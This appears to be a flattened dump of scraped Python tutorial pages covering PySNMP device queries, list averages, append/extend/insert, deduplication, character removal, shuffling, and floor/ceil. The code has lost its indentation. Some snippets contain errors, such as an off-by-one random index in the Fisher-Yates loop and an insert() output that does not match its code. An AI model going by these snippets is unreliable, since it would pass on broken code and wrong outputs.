the file and run the file using the following command in the command prompt.', 'Explanation:', 'Explanation:', 'The above snippet of code returns a list that can be expanded by prepending a *, as we did in the get() method.', 'Explanation:', 'Let us consider the following snippet of code for the same:', 'Explanation:', 'In the above snippet of code, we have defined a function where we used the try-except method to check for any raised error.', 'In the case of SNMPv2c (or lower), we have to specify the community. We can do that using the CommunityData object, as shown below:', 'Let us consider the following example for better understanding.', 'Explanation:', 'Explanation:', 'In the above snippet of code, we have printed the result of the get() function in getting the hostname of the device.', 'Let us consider the following snippet of code to understand the working of the get_bulk() function.', 'Explanation:', 'Let us consider the following example for better understanding.', 'Explanation:', 'Let us consider executing the following snippet of code.']","['First of all, we have to install the PySNMP module. We can use the pip installer in order to install the required module with the help of the following command.', 'If the program runs without raising any import error, the module is installed properly. Else it is recommended to reinstall the module and refer to its official documentation.', 'The Get operation of SNMP enables us to retrieve the value of an individual object in the MIB. We can also utilize it for getting a list of individual objects. We can begin writing out the get() function as shown below:', 'The function generates a handler for the session of SNMP and fetches the details from it. In order to perform that, it depends on two methods we have to create: construct_object_types and fetch.', 'Now, let us test the get() function. We will use it to retrieve the hostname of the device, which is object 1.3.6.1.2.1.1.5.0. We can simply write the following snippet of code:', 'We can use the get_bulk_auto() function to tell the code to retrieve the count variable from another OID. Hence, we can specify an object ID instead of specifying a number. The function will make a get for the object and utilize it as a count.', 'In the above snippet of code, we have defined the get_bulk_auto() function and specified the count variable using get() and return the get_bulk() function.']","['SNMP, also known as Simple Network Management Protocol, is a standard way to communicate between a management server and a remote device, the agent. The goal of SNMP is to have the manager understand (or even change) data on the agent. For Instance, the manager can check which interfaces are up and which are down or change the hostname of the remote device.', 'The SNMP agent prepares most of the details the manager can read or change in a special table, the MIB. The MIB is a tree-like structure, where a number will denote each node in the tree. For Instance, 1.3.6.1.2.1.1 denotes the description of the system. If some of us wonder where this chain of numbers came from, this is the whole tree structure! Each number associates with a name. Consequently, we can translate that into a more explicative iso.org.dod.internet.mgmt.mib-2.system.sysDescr.', 'PySNMP is an open-source module for Python. Unlike telnet or HTTP, Python does not natively implement SNMP. After all, just network and system engineers will require a Python developer on the plant. PySNMP does a great job of covering the lack of native Python. In general, the PySNMP module allows us to utilize any version of SNMP, both as an agent or as a manager. Creating an agent implies that we are building an application or an appliance. However, we will only be discussing the use of PySNMP in managing a remote device.', 'Moreover, we will understand the different functionalities of PySNMP in Python. The main target for this tutorial will be to create a quick python program that can make things easy for us. Within the program, we will have all the operations of SNMP we require.', 'From the above snippet of code, we can observe the leveraging of the High-Level API of PySNMP. We have defined a simple function as get(), which first requires a target (IP or remote device name). Then, it needs the list of Object IDs (oids) we need to get and, after that, a set of credentials for the session authentication. We can also specify a distinct UDP port if we need, and utilize a prevailing SNMP engine or custom context. We may require utilizing the same engine for all the operations on the same device, which saves resources. However, this is not required for a simple snippet of code so that we can ignore both engines as well as context.', 'As we discussed earlier, having more strength implies more complexity. Thus, the hlapi.getCmd() function requires some special hlapi.ObjectType objects, and not a simple list of string OIDs. Hence, the construct_object_type function creates as per the needs of PySNMP. We can simply copy and paste it into the code if we do not have time. However, this should be a very simple function; let us take a look:', 'The fetch() function is a masterpiece of the Python SMP Tutorial. In general, we wrote it so that we can reutilize it for other functions based on PySNMP, such as get-bulk. It simply loops on the handler multiple times as per the count variable. If there is any error raised, the process will be stopped, and the RuntimeError message will be returned. In any other scenario, it stores the data in a list of dictionaries.', 'In the above snippet of code, we have constructed the try-except method to stop iteration for a specific reason. In cases where the user specifies the count higher than the number of objects we actually have, we simply stop and return what we got so far. This is the purpose of the construct.', 'What is the need of returning a list of dictionaries? In every get operation, we can get various object IDs. Hence, every dictionary will consist of the object ID as the key and the value of the OID in the MIB as the value of that key. In a scenario where we need more than one OIDs in a single get, we will return a dictionary with multiple keys. But what is the need for a list, then? Using the get operation, we can retrieve the data only once. However, as we will see in get bulk, we might need to get similar details multiple times on various instances. Let us consider an example for better understanding. Suppose we need to check the errors on all the interfaces: the information is always the errors; however, we have different instances (one per interface). We can visualize it using a list, where each data element is a dictionary depicting an instance.', 'The authentication system of the PySNMP library is strong and quite straightforward. There is no reason to write an extra layer above it, so we can directly utilize it. The get() function, along with the rest, have a special authentication object in the credentials variable. This object is varied if we use SNMPv2c or SNMPv3.', 'Instead, SNMPv3 is complex. This is because it utilizes a user with two passwords and two protocols: The first for authentication and the other for encryption. Hence, we have to specify the name of the user, authentication password, authentication protocol, the password for encryption, and protocol for encryption. We can do it using the UsmUserData class.', ""In the above snippet of code, we have used the UsmUserData class and entered the required details. It is simpler than it appears; we have to know the remote device's protocols. However, some of us may refer to the complete official documentation on UsmUserData."", ""The get_bulk() method retrieves more than one instance of the same Object ID, let's say one for every interface. This function becomes supportable when we are working with tables, such as the routing table of interface one. It is quite straightforward and functions similar to the get() method. But it requires some extra details: which object to start with and a number of instances we need to get. We deliver them in start_from and count."", 'In the above snippet of code, we have defined the get_bulk() function where we specified the handler. At last, we have returned the fetch() function. As a result, we are expecting a list of dictionaries, so we do not have to extract just the first dictionary as we did use the get() function.', 'The get_bulk_auto() function is the improved version of the get_bulk() function. Suppose we wanted to loop through the device interfaces using get_bulk(). How can we know the number of interfaces? And this becomes necessary as SNMP needs to know how many times to iterate. We cannot know that in advance; however, we can use SNMP as an option to find this information.']","['$ pip install pysnmp', '# importing the required module', 'import pysnmp', '$ python .py', '# importing the required module', 'from pysnmp import hlapi', '# defining the get() function', 'def get(', 'target,', 'oids,', 'credentials,', 'port = 161,', 'engine = hlapi.SnmpEngine(),', 'context = hlapi.ContextData()', 'handler = hlapi.getCmd(', 'engine,', 'credentials,', 'hlapi.UdpTransportTarget((target, port)),', 'context,', '*construct_object_types(oids)', 'return fetch(handler, 1)[0]', 'def construct_object_types(listOfOids):', 'objectTypes = []', 'for oid in listOfOids:', 'objectTypes.append(hlapi.ObjectType(hlapi.ObjectIdentity(oid)))', 'return objectTypes', 'def fetch(handler, count):', 'res = []', 'for i in range(count):', 'try:', 'error_indication, error_status, error_index, var_binds = next(handler)', 'if not error_indication and not error_status:', 'items = {}', 'for var_bind in var_binds:', 'items[str(var_bind[0])] = cast(var_bind[1])', 'res.append(items)', 'else:', ""raise RuntimeError('Got SNMP error: {0}'.format(error_indication))"", 'except StopIteration:', 'break', 'return res', 'def cast(val):', 'try:', 'return int(val)', 'except (ValueError, TypeError):', 'try:', 'return float(val)', 'except (ValueError, TypeError):', 'try:', 'return str(val)', 'except (ValueError, TypeError):', 'pass', 'return val', ""hlapi.CommunityData('JAVATPOINT')"", 'hlapi.UsmUserData(', ""'testuser',"", ""authKey = 'authenticationkey',"", ""privKey = 'encryptionkey',"", 'authProtocol = hlapi.usmHMACSHAAuthProtocol,', 'privProtocol = hlapi.usmAesCfb128Protocol', ""print(get('10.0.0.1', ['1.3.6.1.2.1.1.5.0'], hlapi.CommunityData('JAVATPOINT')))"", 'def get_bulk(', 'target,', 'oids,', 'credentials,', 'count,', 'start_from = 0,', 'port = 161,', 'engine = hlapi.SnmpEngine(),', 'context = hlapi.ContextData()):', 'handler = hlapi.bulkCmd(', 'engine,', 'credentials,', 'hlapi.UdpTransportTarget(( target, port )),', 'context,', 'start_from, count,', '*construct_object_types( oids )', 'return fetch(handler, count)', 'def get_bulk_auto(', 'target,', 'oids,', 'credentials,', 'count_oid,', 'start_from = 0,', 'port = 161,', 'engine = hlapi.SnmpEngine(),', 'context = hlapi.ContextData()):', 'count = get(', 'target,', '[count_oid],', 'credentials,', 'port,', 'engine,', 'context', ')[count_oid]', 'return get_bulk(target, oids, credentials, count, start_from, port, engine, context)', 'ele = get_bulk_auto(', ""'10.0.0.1',"", ""['1.3.6.1.2.1.2.2.1.2 ', '1.3.6.1.2.1.31.1.1.1.18'],"", ""hlapi.CommunityData('JAVATPOINT'),"", ""'1.3.6.1.2.1.2.1.0')"", 'for i in ele:', 'for x, y in i.items():', 'print(""{0} = {1}"".format(x, y))', ""print('')""]","[""{'1.3.6.1.2.1.1.5.0': 'R1.sdn.local'}"", '1.3.6.1.2.1.2.2.1.2.1=FastEthernet1/0', '1.3.6.1.2.1.31.1.1.1.18.1=', '1.3.6.1.2.1.2.2.1.2.2=FastEthernet0/0', '1.3.6.1.2.1.31.1.1.1.18.2=', '1.3.6.1.2.1.2.2.1.2.3=FastEthernet0/1', '1.3.6.1.2.1.31.1.1.1.18.3=Test Desc', '1.3.6.1.2.1.2.2.1.2.4=Serial2/0', '1.3.6.1.2.1.31.1.1.1.18.4=', '1.3.6.1.2.1.2.2.1.2.5=Serial2/1', '1.3.6.1.2.1.31.1.1.1.18.5=', '1.3.6.1.2.1.2.2.1.2.6=Serial2/2', '1.3.6.1.2.1.31.1.1.1.18.6=', '1.3.6.1.2.1.2.2.1.2.7=Serial2/3', '1.3.6.1.2.1.31.1.1.1.18.7=', '1.3.6.1.2.1.2.2.1.2.9=Null0', '1.3.6.1.2.1.31.1.1.1.18.9=']",[],[]
340,['Average of list in Python'],"['In this tutorial, we will discuss how we can compute the average of the list in Python.']","['https://www.javatpoint.com/append-vs-extend-vs-insert-in-python', 'https://www.javatpoint.com/snmp-module-in-python', 'https://www.javatpoint.com/append-vs-extend-vs-insert-in-python', 'https://www.javatpoint.com/snmp-module-in-python', 'https://www.javatpoint.com/append-vs-extend-vs-insert-in-python']",[],[],"['Using sum()', 'Using reduce()', 'Using mean()', 'Conclusion']",[],[],"['The average of a list is defined as the sum of elements present in the list divided by the number of elements present in the list.', 'Here, we will make use of three different approaches to calculate the average of the elements present in the list using Python.', ""So, let's get started…"", 'In the first method, we have used the sum() and len() to calculate the average.', 'The following program illustrates the same-', 'Explanation-', ""It's time to have a look at what we have done in the above program-"", 'In the next program, we will see how reduce() can help us to do the same.', 'The program given below shows how it can be done-', 'Explanation', ""Let's understand what we have done here-"", 'In the last program, we will learn how mean() can be used to calculate the average of list', 'The following program shows how it can be done-', 'Explanation-', ""It's time to have a look at what we have done in the above program-"", 'In this tutorial, we learned the different methods of calculating the average of elements present in the list using Python.']",[],[],"['# Python program to get average of a list', 'def calc_average(lst):', 'return sum(lst) / len(lst)', 'lst = [24, 19, 35, 46, 75, 29, 30, 18]', 'average = calc_average(lst)', '# Printing the average value of the list', 'print(""The average of the list is "", round(average, 3))', '# Python program to obtain the average of a list', '# Using reduce() and lambda', 'from functools import reduce', 'def calc_average(lst):', 'return reduce(lambda a, b: a + b, lst) / len(lst)', '#initializing the list', 'lst = [24, 19, 35, 46, 75, 29, 30, 18]', 'average = calc_average(lst)', '# Printing average of the list', 'print(""The Average of the list is "", round(average, 2))', '# Python program to obtain the average of a list', '# Using mean()', 'from statistics import mean', 'def calc_average(lst):', 'return mean(lst)', 'lst = [24, 19, 35, 46, 75, 29, 30, 18]', 'average = calc_average(lst)', '# Printing the average of the list', 'print(""The average of the list is "", round(average, 2))']","['The average of the list is  34.5', 'The average of the list is  34.5', 'The average of the list is  34.5']",[],"['|||Using sum()|||Using reduce()|||Using mean()||||||In the first step, we have created a function that takes a list as its parameter and then returns the average using sum() and len(). We know that sum() is used to calculate the sum of elements and len() tells us about the length of the list.|||After this, we have initialized the list whose average, we would like to calculate.|||In the next step, we have passed this list as a parameter in our function.|||Finally, we printed the resultant value.||||||In the first step, we have imported reduce from functools so that we can use it in our program to compute the average of elements.|||Now, we have created a function calc_average that takes a list as its parameter and uses lambda(a precise way of writing functions in python) inside reduce to calculate the average.|||After this we have initialized whose average, we would like to calculate.|||In the next step, we have passed this list as a parameter in our function.|||Finally, we printed the resultant value.||||||In the first step, we have imported mean from statistics so that we can use it in our program to compute the average of elements.|||Now, we have created a function calc_average that takes a list as its parameter and uses mean() to calculate the average.|||After this we have initialized whose average, we would like to calculate.|||In the next step, we have passed this list as a parameter in our function.|||Finally, we printed the resultant value.|||']"
341,"['Difference between Append, Extend and Insert in Python']","['List: are like an array of dynamic size, declared in another programming language such as vector in C++ or Arraylist in Java. It is not necessary for a list to be homogeneous, and this is the main reason that makes it the most powerful tool in Python. A single list can contain different data types such as strings, integers, and objects.']","['https://www.javatpoint.com/how-to-remove-duplicates-from-a-list-in-python', 'https://www.javatpoint.com/average-of-list-in-python', 'https://www.javatpoint.com/how-to-remove-duplicates-from-a-list-in-python', 'https://www.javatpoint.com/average-of-list-in-python', 'https://www.javatpoint.com/how-to-remove-duplicates-from-a-list-in-python']",[],[],"['Difference Between Append(), Insert() and Extend()', 'Conclusion']","['Append() Function', 'Insert() Function', 'Extend() Function']",[],"[""In this tutorial, we will learn how append(), expend(), and insert() functions are different from each other in Python's lists."", 'The ""element_1"" can be an integer, tuple, string or another list.', 'The ""element_1"" can be an integer, tuple, string, or object.', ""Let's compare all the three methods in a single program:""]","['As we know, lists are mutable, so they can be altered even after creating them. Lists has several methods, among which append(), insert(), extend() are most common ones.', 'The append() function is used for adding an element at the end of the list. The argument we pass in the append() function is added as a single element at the end of the list, and the length of the list will increase by 1.', 'The insert() function is used for inserting the value at any desired position in the list. We have to pass two arguments in it; the first is for index where we want to inter the element, and the second is for element to be inserted.', 'The extend() function is used for appending each element of the iterable (list, string, or tuple) to the end of the list. This will increase the length of the list by the number of elements of the iterable are passed as an argument.', 'In this tutorial, we discussed different methods that can be used for modifying lists in Python. We have also explained the difference between append(), insert(), and extend() functions in the list of Python.']",[],"['list_name1.append(element_1)', ""list_1 = ['The', 'list_1']"", '# Using the method', ""list_1.append('is')"", ""list_1.append('an')"", ""list_1.append('example')"", '# Displaying the list', 'print (""The added elements in the given list are: "", list_1)', 'list_name1.insert(index, element_1)', ""list_1 = ['The', 'is']"", '# Using the method', ""list_1.insert(3,'an')"", ""list_1.insert(1, 'list_1')"", ""list_1.insert(4, 'example')"", '# Displaying the list', 'print (""The inserted elements in the given list are: "", list_1)', 'list_name1.extend(iterable)', ""list_1 = ['The', 'list_1']"", '# Using the method', ""list_1.extend(['is', 'an', 'example'])"", ""list_1.extend('javatpoint')"", '# Displaying the list', 'print (""The extended elements in the given list are: "", list_1)', ""list_name1 = ['this', 'is', 'LIST_1']"", ""list_name2 = ['this', 'is', 'of', 'LIST_2']"", ""list_name3 = ['this', 'is', 'LIST_3']"", ""S = ['Example_1', 'Example_2']"", '# Using methods', 'list_name1.append(S)', 'list_name2.insert(2, S)', 'list_name3.extend(S)', '# Displaying lists', 'print (""The appended elements in the given list are: "", list_name1)', 'print (""The inserted elements in the given list are: "", list_name2)', 'print (""The extended elements in the given list are: "", list_name3)']","[""The added elements in the given list are: ['The', 'list_1', 'is', 'an', 'example']"", ""The inserted elements in the given list are:  ['The', 'list_1', 'is', 'an', 'example']"", ""The extended elements in the given list are:  ['The', 'list_1', 'is', 'an', 'example', 'j', 'a', 'v', 'a', 't', 'p', 'o', 'i', 'n', 't']"", ""The appended elements in the given list are: ['this', 'is', 'LIST_1', ['Example_1', 'Example_2']]"", ""The inserted elements in the given list are: ['this', 'is', ['Example_1', 'Example_2'], 'of', 'LIST_2']"", ""The extended elements in the given list are: ['this', 'is', 'LIST_3', 'Example_1', 'Example_2']""]","['append() Function|||insert() Function|||extend() Function&&&The element passed in the argument is added at the end of the list.|||The element passed in the argument is added at the mentioned index of the list.|||Each element of the iterable is passed as ab argument is added at the end of the list.&&&The element passed as an argument will be added as a single element without any changes.|||The element passed in the argument will be added as a single element at the desired location without any changes.|||The iterable passed as an argument will append each of its elements at the end of the list.&&&The length of the list will increase by 1.|||The length of the list will increase by 1.|||The length of the list will increase by the number of elements in the iterable.&&&The append() function has a constant time complexity of O(1).|||The insert() function has linear complexity of O(n).|||The extend() function has a time complexity of O(k), where ""k"" is the length of the iterable.']",[]
342,['How to Remove Duplicates from a list in Python'],"['When an element occurs more than once in a list, we refer to it as a duplicate.']","['https://www.javatpoint.com/remove-multiple-characters-from-a-string-in-python', 'https://www.javatpoint.com/append-vs-extend-vs-insert-in-python', 'https://www.javatpoint.com/remove-multiple-characters-from-a-string-in-python', 'https://www.javatpoint.com/append-vs-extend-vs-insert-in-python', 'https://www.javatpoint.com/remove-multiple-characters-from-a-string-in-python']",[],[],"['The Basic Approach', 'Using List Comprehension', 'Using Set()', 'Using enumerate()', 'Using OrderedDict', 'Conclusion']",[],[],"['In this tutorial, we will learn different methods of removing these duplicates from a list in Python.', 'Let us discuss each one of them in detail.', 'In the first method, we will discuss the basic approach of removing duplicates from the list using Python.', 'Explanation', ""So, now it's time to have a glance at the explanation of the above program."", 'In the second program, we will make use of list comprehension to meet our objective.', 'The following program illustrates the same-', 'Explanation', ""Let's understand what we have done in the above program-"", 'In the third approach, we will see how set() can be used to obtain a list of distinct elements.', 'The program given below shows how it can be done-', 'Explanation', ""Let's try and understand what happened here,"", ""Now let's see how enumerate() can be used to meet our objective."", 'The following program illustrates the same-', 'Explanation', 'Finally, in the last program we will see how OrderedDict can be used to remove duplicates from list using Python.', 'The program given below shows how it can be done-', 'Explanation', 'In this tutorial, we explored and learned some interesting methods to remove duplicates from a list in Python.']",[],[],"['#initializing the list', 'list_value1=[12,15,11,12,8,15,3,3]', 'print(""The initialized list is "",list_value1)', 'res_list=[]', 'for i in list_value1:', 'if i not in res_list:', 'res_list.append(i)', '#printing the list after removing duplicate elements', 'print(""The resultant list after removing duplicates is "",res_list)', '#initializing the list', 'list_value1=[12,15,11,12,8,15,3,3]', 'print(""The initialized list is "",list_value1)', 'res_list=[]', '#using list comprehension', '[res_list.append(i) for i in list_value1 if i not in res_list]', '#printing the list after removing duplicate elements', 'print(""The resultant list after removing duplicates is "",res_list)', '#initializing the list', 'list_value1 = [12,15,11,12,8,15,3,3]', 'print(""The initialized list is "",list_value1)', 'res_list = []', '#using set()', 'list_value1 = list(set(list_value1))', '#printing the list after removing duplicate elements', 'print(""The resultant list after removing duplicates is "",list_value1)', '#initializing the list', 'list_value1 = [12,15,11,12,8,15,3,3]', 'print(""The initialized list is "",list_value1)', 'res_list = [x for n,x in enumerate(list_value1) if x not in list_value1[:n]]', '#printing the list after removing duplicate elements', 'print(""The resultant list after removing duplicates is "",res_list)', 'from collections import OrderedDict', '#initializing the list', 'list_value1 = [12,15,11,12,8,15,3,3]', 'print(""The initialized list is "",list_value1)', '#using OrderedDict', 'res_list = list(OrderedDict.fromkeys(list_value1))', '#printing the list after removing duplicate elements', 'print(""The resultant list after removing duplicates is "",res_list)']","['The initialized list is  [12, 15, 11, 12, 8, 15, 3, 3]', 'The resultant list after removing duplicates is  [12, 15, 11, 8, 3]', 'The initialized list is  [12, 15, 11, 12, 8, 15, 3, 3]', 'The resultant list after removing duplicates is  [12, 15, 11, 8, 3]', 'The initialized list is  [12, 15, 11, 12, 8, 15, 3, 3]', 'The resultant list after removing duplicates is  [12, 15, 11, 8, 3]', 'The initialized list is  [12, 15, 11, 12, 8, 15, 3, 3]', 'The resultant list after removing duplicates is  [12, 15, 11, 8, 3]', 'The initialized list is  [12, 15, 11, 12, 8, 15, 3, 3]', 'The resultant list after removing duplicates is  [12, 15, 11, 8, 3]']",[],"[""|||The Basic Approach|||Using List Comprehension|||Using Set()|||Using enumerate()|||Using OrderedDict||||||The first step is to initialize the list that contains duplicate values.|||After this, we have printed this list so that it becomes easy for us to compare the lists in the output.|||In the next step, we have declared an empty list that will hold all the unique values and then used for loop followed by decision making to check whether a particular element exists in the list or not, if it doesn't exist, we will append it in the list.|||Finally, we have displayed the resultant list.||||||The first step is to initialize the list that contains duplicate values.|||After this, we have printed this list so that it becomes easy for us to compare the lists in the output.|||In the next step, we have used list comprehension to build the same logic.|||Finally, we have displayed the resultant list.||||||The first step is to initialize the list that contains duplicate values.|||After this, we have printed this list so that it becomes easy for us to compare the lists in the output.|||In the next step, we have used set() inside list() and passed list_value1 as a parameter so that we can obtain a list of distinct elements.|||Finally, we have displayed the resultant list.||||||The first step is to initialize the list that contains duplicate values.|||After this, we have printed this list so that it becomes easy for us to compare the lists in the output.|||In the next step, we have used enumerate() inside list comprehension that will return a list containing unique elements.|||Finally, we have displayed the resultant list.||||||The first step is to import OrderedDict from collections so that we can use it to remove duplicates from the list.|||In the next step, we have initialized the list that contains duplicate values.|||After this, we have printed this list so that it becomes easy for us to compare the lists in the output.|||Now we have passed list_values1 inside OrderedDict.fromkeys().|||Finally, we have displayed the resultant list that does not contain any duplicate elements.|||""]"
343,['Remove Multiple Characters from a String in Python'],"['We already know that strings are defined as a sequence of characters, and we can perform a variety of operations on them.']","['https://www.javatpoint.com/shuffle-in-python', 'https://www.javatpoint.com/how-to-remove-duplicates-from-a-list-in-python', 'https://www.javatpoint.com/shuffle-in-python', 'https://www.javatpoint.com/how-to-remove-duplicates-from-a-list-in-python', 'https://www.javatpoint.com/shuffle-in-python']",[],[],"['Using nested replace()', 'Using translate() and maketrans()', 'Using re.subn()', 'Using re.sub()', 'Conclusion']",[],[],"['In this tutorial, we will learn one more interesting task that can be accomplished using strings in Python.', 'Here we will see how we can remove multiple characters from it.', 'We have listed below the methods that we will learn to meet our objective.', 'In the program given below, we will see how replace() is used to remove multiple characters from the string.', 'Explanation-', 'The following program shows how it can be done.', 'Explanation-', 'Now we will discuss how re.subn() can become an aid for this. The subn() returns a new string with the total number of replacements.', 'The program given below shows how it can be done.', 'Explanation-', 'In the last program, we will do the same thing using sub()', 'The following program illustrates how it can be done-', 'Explanation-', 'In this tutorial, we learned how we can remove multiple characters from a string using Python.']","['In the second program, we will see how translate() and maketrans() can be used to do the same. The users must keep this thing in their mind that it only works in Python 2.']",[],"['#initializing the string', ""string_val = 'learnpythonlearn'"", '#displaying the string value', 'print(""The initialized string is "", string_val)', '#using nested replace()', ""res_str = string_val.replace('l', '%temp%').replace('l', 'e').replace('%temp%', 'e')"", '#printing the resultant string', 'print (""The string after replacing the characters is "", res_str)', 'import string', '#initializing the string', ""string_val='learnpythonlearn'"", '#displaying the string value', 'print(""The initialized string is "",string_val)', '#using translate() & maketrans()', ""res_str=string_val.translate(string.maketrans('le','el'))"", '#printing the resultant string', 'print(""The string after replacing the characters is "",res_str)', '#importing the re module', 'import re', '#initializing the string value', 'string_val = ""To get the result 100, we can multiply 10 by 10""', '#defining the function', 'def pass_str(string_val):', ""string_val, n = re.subn('[0-9]', 'A', string_val)"", 'print (string_val)', '#displaying the resultant value', 'pass_str(string_val)', '#importing the re module', 'import re', '#initializing the string value', 'string_val = ""To get the result 100, we can multiply 10 by 10""', '#defining the function', 'def pass_str(string_val):', ""string_val = re.sub('[0-9]', 'Z', string_val)"", 'print(string_val)', '#displaying the resultant value', 'pass_str(string_val)']","['The initialized string is  learnpythonlearn', 'The string after replacing the characters is  eearnpythoneearn', 'The initialized string is  learnpythonlearn', 'The string after replacing the characters is  eearnpythoneearn', 'To get the result AAA, we can multiply AA by AA', 'To get the result ZZZ, we can multiply ZZ by ZZ']",[],"['|||Using nested replace()|||Using translate() & maketrans()|||Using subn()|||Using sub()||||||In the first step, we have initialized the string whose characters we would like to replace.|||After this, we have displayed the original string so that we can easily understand the difference between this and the expected output.|||Now we have used replace() and specified the characters that we wish to remove or change.|||On executing the program, the desired output is displayed.||||||In the first step, we have initialized the string whose characters we would like to replace.|||After this, we have displayed the original string so that we can easily understand the difference between this and the expected output.|||Now we have used replace() and specified the characters that we wish to remove or change.|||On executing the program, the desired output is displayed.||||||In the first step, we have imported the re module that will help us to use the required functions.|||After this, we have initialized the string whose characters we would like to replace or remove.|||The next step is to define a function that takes the string value as its parameter.|||In the function definition, we have used subn() that takes three parameters. The first parameter is the pattern that we wish to replace, the second is with what element or number we want to replace it and the third is the string.|||Finally, the print statement at the end shows that the processed string is displayed.|||We have passed this string at the end so that we get the expected output.||||||In the first step, we have imported the re module that will help us to use the required functions.|||After this, we have initialized the string whose characters we would like to replace or remove.|||The next step is to define a function that takes the string value as its parameter.|||In the function definition, we have used sub() that takes three parameters. The first parameter is the pattern that we wish to replace, the second is with what element or number we want to replace it and the third is the string.|||Finally, the print statement at the end shows that the processed string is displayed.|||We have passed this string at the end so that we get the expected output.|||']"
344,['Shuffle in Python'],['Shuffling refers to the rearranging of elements in a random order which means no specific sequence is considered while arranging the elements.'],"['https://www.javatpoint.com/floor-and-ceil-functions-in-python', 'https://www.javatpoint.com/remove-multiple-characters-from-a-string-in-python', 'https://www.javatpoint.com/floor-and-ceil-functions-in-python', 'https://www.javatpoint.com/remove-multiple-characters-from-a-string-in-python', 'https://www.javatpoint.com/floor-and-ceil-functions-in-python']",[],[],"['Using Fisher-Yates Shuffle Algorithm', 'Using shuffle()', 'Using random.sample()', 'Random Selection of Elements and then Appending them in a list', 'Conclusion']",[],[],"['In this tutorial, we will learn how we can shuffle the elements of a list using Python.', 'The different approaches that we will use to shuffle the elements are as follows-', 'We will discuss each method in detail.', ""So, let's begin with the first one,"", 'Explanation', ""Let's understand what we have done in the above program."", 'In the second method, we will see how shuffle() can be used to shuffle the elements of our list.', 'Consider the program given below-', 'Explanation', ""Let's understand what we have done in the above program,"", 'In the third approach, we will use random.sample() to do the same.', 'The following program illustrates how it can be done-', 'Explanation', ""It's time to understand the above program-"", ""Finally, it's time to discuss the last approach, it's indeed an interesting one, let's see how…."", 'Explanation', ""Now, let's see the explanation of this code,"", 'In this tutorial, we learned the different methods of shuffling the elements of a list in Python.']",[],[],"['# using Fisher-Yates shuffle Algorithm to shuffle a list', 'import random', '# initializing the list', 'list_values1 = [11,20,19,43,22,10]', '# Printing the list', 'print (""The initialized list is: "",(list_values1))', 'for i in range(len(list_values1)-1, 0, -1):', '# choosing a random index from 0 to i', 'k = random.randint(0, i + 1)', 'list_values1[i], list_values1[k] = list_values1[k], list_values1[i]', '# Printing the shuffled list', 'print (""The shuffled list is : "",(list_values1))', 'import random', '# initializing the list', 'list_values1 = [11,20,19,43,22,10]', '# Printing the list', 'print (""The initialized list is : "",(list_values1))', '#using shuffle()', 'random.shuffle(list_values1)', '# Printing the shuffled list', 'print (""The shuffled list is : "",(list_values1))', 'import random', '# initializing the list', 'list_values1 = [11,20,19,43,22,10]', '# Printing the list', 'print (""The initialized list is : "",(list_values1))', '#using random.sample()', 'res_list=random.sample(list_values1,len(list_values1))', '# Printing the shuffled list', 'print (""The shuffled list is : "",(res_list))', 'import random', '# initializing the list', 'list_values1 = [11,20,19,43,22,10]', '# Printing the list', 'print (""The initialized list is: "",(list_values1))', 'len_list=len(list_values1)', 'for i in range(len_list):', 'k=random.randint(0,len_list-1)', 'e=list_values1.pop(k)', 'list_values1.append(e)', '# Printing the shuffled list', 'print (""The shuffled list is : "",(list_values1))']","['The initialized list is :  [11, 20, 19, 43, 22, 10]', 'The shuffled list is :  [11, 43, 20, 19, 10, 22]', 'The initialized list is :  [11, 20, 19, 43, 22, 10]', 'The shuffled list is :  [22, 10, 20, 11, 19, 43]', 'The initialized list is :  [11, 20, 19, 43, 22, 10]', 'The shuffled list is :  [43, 20, 19, 11, 10, 22]', 'The initialized list is :  [11, 20, 19, 43, 22, 10]', 'The shuffled list is :  [19, 22, 20, 43, 10, 11]']",[],"[""|||Using Fisher-Yates shuffle algorithm|||Using shuffle()|||Using sample()|||Random selection of elements and then appending them in a list||||||In the first step, we have imported the random module.|||After this, we have an initialized list that contains different numeric values.|||In the next step, we used the for loop and then randomly selected an element and then swapped it with the element at random index.|||Finally, we have displayed the shuffled list in the output.||||||In the first step, we have imported the random module.|||After this, we have an initialized list that contains different numeric values.|||In the next step, we used the shuffle() and passed 'list_values1' as a parameter.|||Finally, we have displayed the shuffled list in the output.||||||In the first step, we have imported the random module.|||After this, we have an initialized list that contains different numeric values.|||In the next step, we used the sample() and passed 'list_values1' and the length of the list as its parameters.|||Finally, we have displayed the shuffled list in the output.||||||In the first step, we have imported the random module.|||After this, we have an initialized list that contains different numeric values and then calculated the length of the list.|||In the next step, we used the sample() and passed 'list_values1' and the length of the list as its parameters.|||Now we have used for loop that randomly selects an element, removes it, and then appends it to the list.|||Finally, we have displayed the shuffled list in the output.|||""]"
345,['The floor() and ceil() Functions in Python'],"['In this tutorial, we will learn how to use the floor() and ceil() functions of the math module in Python.']","['https://www.javatpoint.com/sqrt-math-function-of-python', 'https://www.javatpoint.com/shuffle-in-python', 'https://www.javatpoint.com/sqrt-math-function-of-python', 'https://www.javatpoint.com/shuffle-in-python', 'https://www.javatpoint.com/sqrt-math-function-of-python']",[],[],['Conclusion'],"['The floor() Function:', 'The ceil() Function:']",[],"['Parameter:', 'We can pass the numeric expression.', 'It returns the largest integer value that is not greater than ""X"".', ""Let's see an example to get an idea of implementing the floor() function in Python."", 'Parameter:', 'We can pass the numeric expression.', 'It returns the smallest integer value that is not less than ""X"".', ""Let's see an example to get an idea of implementing the ceil() function in Python."", 'In this tutorial, we discussed how to implement the floor() and ceil() functions of the math module in Python.']","['The floor() function is used for getting the floor integer of ""X"", which mean the largest integer value, which is not greater than ""X"", basically the nearest round-down number of it.', 'The ceil() function of the math module in Python is used for getting the ceiling value of ""X"" in return, which means the smallest integer value, which is not less than ""X"", basically, the nearest round-off number of it.']",[],"['math.floor(X)', 'import math as M', '# printing the floor value by using floor() function of math module', 'print (""The floor value of math.floor(-54.21) is: "", M.floor(-54.21))', 'print (""The floor value of math.floor(432.56) is: "", M.floor(432.56))', 'print (""The floor value of math.floor(320.62) is: "", M.floor(320.62))', 'math.ceil(X)', 'import math as M', '# printing the ceiling value by using ceil() function of math module', 'print (""The ceiling value of math.ceil(-54.21) is: "", M.ceil(-54.21))', 'print (""The ceiling value of math.ceil(432.56) is: "", M.ceil(432.56))', 'print (""The ceiling value of math.ceil(320.62) is: "", M.ceil(320.62))']","['The floor value of math.floor(-54.21) is:  -55', 'The floor value of math.floor(432.56) is:  432', 'The floor value of math.floor(320.62) is:  320', 'The ceiling value of math.ceil(-54.21) is:  -54', 'The ceiling value of math.ceil(432.56) is:  433', 'The ceiling value of math.ceil(320.62) is:  321']",[],[]
